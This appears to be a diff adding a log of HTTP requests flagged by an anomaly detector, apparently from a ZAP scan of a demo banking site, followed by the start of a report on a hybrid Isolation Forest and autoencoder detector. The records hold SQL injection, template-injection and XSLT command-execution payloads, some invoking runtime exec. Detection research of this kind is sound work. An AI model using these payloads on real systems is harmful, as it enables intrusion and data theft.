+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89771"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89772"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89773"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89774"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89775"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89776"
+  },
+  "path": "/Documents/JohnSmith/index.jsp?content=zj%7B%40math+key%3D%228603%22+method%3D%22multiply%22+operand%3D%222081%22%2F%7Dzj",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89777"
+  },
+  "path": "/Privacypolicy.jsp?sec=zj%7B%40math+key%3D%222386%22+method%3D%22multiply%22+operand%3D%226177%22%2F%7Dzj&template=US",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89778"
+  },
+  "path": "/index.jsp?content=zj%23set%28%24x%3D2869*3931%29%24%7Bx%7Dzj&job=MortgageLendingAccountExecutive%3ASales",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9640583992004395,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89779"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=zj%7B4791*4082%7Dzj&btnSubmit=Login",
+  "Confidence_Score": 0.997677356004715,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8977a"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=zj%7B2848*4281%7Dzj&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9964742958545685,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8977b"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=zj%7B9787*8945%7Dzj",
+  "Confidence_Score": 0.8812541961669922,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8977c"
+  },
+  "path": "/index.jsp?content=zj%23set%28%24x%3D9432*9479%29%24%7Bx%7Dzj",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.8675175905227661,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8977d"
+  },
+  "path": "/default.jsp?content=zj%7B%40math+key%3D%229072%22+method%3D%22multiply%22+operand%3D%221265%22%2F%7Dzj",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8977e"
+  },
+  "path": "/disclaimer.htm?url=zj%7B%40math+key%3D%222579%22+method%3D%22multiply%22+operand%3D%225121%22%2F%7Dzj",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9955467372134039,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8977f"
+  },
+  "path": "/images/index.jsp?content=zj%3Cp+th%3Atext%3D%22%24%7B4206*7594%7D%22%3E%3C%2Fp%3Ezj",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS)"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89780"
+  },
+  "path": "/Privacypolicy.jsp?sec=zj%7B%7B49030%7Cadd%3A23380%7D%7Dzj&template=US",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6597335189580917,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89781"
+  },
+  "path": "/robots.txt",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.538958664983511,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89782"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89783"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89784"
+  },
+  "path": "/index.jsp?content=inside_internships.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89785"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=&btnSubmit=Subscribe",
+  "Confidence_Score": 0.9097478091716766,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89786"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89787"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=CustomerServiceRepresentative%3aCustomerService",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.775989443063736,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89788"
+  },
+  "path": "/index.jsp?content=inside_internships.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89789"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8978a"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8978b"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8978c"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8978d"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8978e"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8978f"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89790"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89791"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89792"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89793"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89794"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89795"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89796"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988559603691,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89797"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89798"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89799"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8979a"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8979b"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8979c"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8979d"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8979e"
+  },
+  "path": "/index.jsp?content=business_insurance.htm",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.5692988634109497,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8979f"
+  },
+  "path": "/doLogin",
+  "body": "uid=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&passw=ZAP&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a0"
+  },
+  "path": "/disclaimer.htm?url=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a1"
+  },
+  "path": "/default.jsp?content=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a2"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&btnSubmit=Subscribe",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a3"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=system-property%28%27xsl%3Avendor%27%29%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a4"
+  },
+  "path": "/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a5"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=%3C",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9963124990463257,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS)"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a6"
+  },
+  "path": "/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&job=MortgageLendingAccountExecutive%3ASales",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a7"
+  },
+  "path": "/static/index.jsp?content=%3C",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9964720904827118,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS)"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a8"
+  },
+  "path": "/search.jsp?query=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897a9"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897aa"
+  },
+  "path": "/WS_FTP.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.538958664983511,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897ab"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897ac"
+  },
+  "path": "/index.jsp?content=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897ad"
+  },
+  "path": "/survey_questions.jsp?step=%3C",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9964609146118164,
+  "Severity": 3,
+  "Reason": "Contains '<' or '>' characters, common in Cross-Site Scripting (XSS)"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897ae"
+  },
+  "path": "/index.jsp?content=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&job=MortgageLendingAccountExecutive%3ASales",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897af"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897b0"
+  },
+  "path": "/static/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897b1"
+  },
+  "path": "/search.jsp?query=system-property%28%27xsl%3Avendor%27%29%2F%3E",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897b2"
+  },
+  "path": "/doLogin",
+  "body": "uid=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&passw=ZAP&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897b3"
+  },
+  "path": "/ws_ftp.ini",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.538958664983511,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c897b4"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&btnSubmit=Subscribe",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains '<' or '>' characters, common in Cross-Site Scripting (XSS) | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+}]
+Report: Comprehensive Threat Detection Systems
+1. Hybrid Network Anomaly Detection System
+1.1. Executive Summary
+This document outlines the architecture and methodology of a hybrid network anomaly detection system. The system is designed to identify potential security threats and unusual behavior within network traffic data. It combines an Isolation Forest and a deep learning Autoencoder, supplemented by a rule-based analysis engine, to provide a robust, accurate, and interpretable solution for network security monitoring. 
+1.2. The Hybrid Model Architecture
+The system's core is a hybrid approach that leverages the unique strengths of two different unsupervised learning algorithms. An event is flagged as a potential anomaly if either of these models identifies it as suspicious. 
+Model 1: The Isolation Forest (The "Partitioning" Expert)
